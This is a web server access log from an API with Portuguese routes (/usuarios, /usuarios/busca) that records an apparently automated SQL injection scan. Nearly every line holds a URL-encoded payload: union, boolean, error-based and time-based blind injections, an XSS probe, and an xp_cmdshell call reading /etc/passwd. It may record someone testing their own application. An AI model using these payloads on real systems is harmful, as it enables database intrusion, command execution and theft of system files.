api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:59968 - "POST /usuarios HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:59972 - "POST /usuarios?Mzet=9989%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:59980 - "POST /usuarios HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:60010 - "GET /usuarios/1 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60034 - "PUT /usuarios/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:60038 - "PUT /usuarios/1?UjPY=7812%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:60044 - "PUT /usuarios/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:60064 - "GET /usuarios/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60080 - "GET /usuarios/busca/?nome=teste&QwtG=1285%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60084 - "GET /usuarios/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60092 - "GET /usuarios/busca/?nome=3609 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60108 - "GET /usuarios/busca/?nome=teste%28%22%27%28..%2C%2C.%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60122 - "GET /usuarios/busca/?nome=teste%27XVZnZP%3C%27%22%3EmQclNM HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60126 - "GET /usuarios/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60140 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6234%3D4892%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27nrSz%27%3D%27nrSz HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60152 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6128%3D1877%2F%2A%2A%2FAND%2F%2A%2A%2F%27GjJU%27%3D%27GjJU HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60158 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6307%3D7035%2F%2A%2A%2FAND%2F%2A%2A%2F%289990%3D9990 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60174 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6655%3D3095 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60176 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2371%3D2278--%2F%2A%2A%2FRGXx HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60188 - "GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282238%3D8304%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8304%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F2168%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60192 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284110%2CCONCAT%280x5c%2C0x7162766b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284110%3D4110%2C1%29%29%29%2C0x71767a7671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27lODF%27%3D%27lODF HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60198 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284110%2CCONCAT%280x5c%2C0x7162766b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284110%3D4110%2C1%29%29%29%2C0x71767a7671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27twEM%27%3D%27twEM HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60206 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284110%2CCONCAT%280x5c%2C0x7162766b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284110%3D4110%2C1%29%29%29%2C0x71767a7671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288821%3D8821 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60216 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284110%2CCONCAT%280x5c%2C0x7162766b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284110%3D4110%2C1%29%29%29%2C0x71767a7671%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60220 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284110%2CCONCAT%280x5c%2C0x7162766b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284110%3D4110%2C1%29%29%29%2C0x71767a7671%29%29--%2F%2A%2A%2FKENT HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60234 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4886%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284886%3D4886%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27VnCs%27%3D%27VnCs HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60258 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4886%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284886%3D4886%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27PKnd%27%3D%27PKnd HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60272 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F4886%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284886%3D4886%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281588%3D1588 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60246 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4886%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284886%3D4886%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60282 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4886%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284886%3D4886%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FsHXB HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60292 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9244%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289244%3D9244%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27wBRe%27%3D%27wBRe HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60304 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9244%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289244%3D9244%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27MNVm%27%3D%27MNVm HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60306 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9244%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289244%3D9244%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282922%3D2922 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60316 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9244%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289244%3D9244%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60322 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9244%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289244%3D9244%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FwJDt HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60328 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7184%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287184%3D7184%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27sThN%27%3D%27sThN HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60338 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7184%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287184%3D7184%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27MIix%27%3D%27MIix HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60340 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7184%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287184%3D7184%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287400%3D7400 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60356 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7184%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287184%3D7184%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60358 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7184%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287184%3D7184%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FHwNw HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60374 - "GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qbvkq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284714%3D4714%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvzvq%27%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60392 - "GET /usuarios/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60396 - "GET /usuarios/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60412 - "GET /usuarios/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60428 - "GET /usuarios/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60376 - "GET /usuarios/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60440 - "GET /usuarios/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60456 - "GET /usuarios/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60470 - "GET /usuarios/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60472 - "GET /usuarios/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2868%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60484 - "GET /usuarios/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2868%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60486 - "GET /usuarios/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2868%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60494 - "GET /usuarios/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2868%29%7C%7CCHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2868%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60498 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5577%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29NFCA%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27xpku%27%3D%27xpku HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60508 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5577%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29NFCA%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27NfXW%27%3D%27NfXW HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60522 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5577%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29NFCA%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284091%3D4091 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60528 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5577%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29NFCA%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60530 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5577%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29NFCA%29--%2F%2A%2A%2FTZed HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60542 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8306%3D%28SELECT%2F%2A%2A%2F8306%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27DfUp%27%3D%27DfUp HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60550 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8306%3D%28SELECT%2F%2A%2A%2F8306%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27qbeo%27%3D%27qbeo HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60554 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8306%3D%28SELECT%2F%2A%2A%2F8306%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%286195%3D6195 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60560 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8306%3D%28SELECT%2F%2A%2A%2F8306%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60568 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8306%3D%28SELECT%2F%2A%2A%2F8306%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FDGFF HTTP/1.1" 200 OK
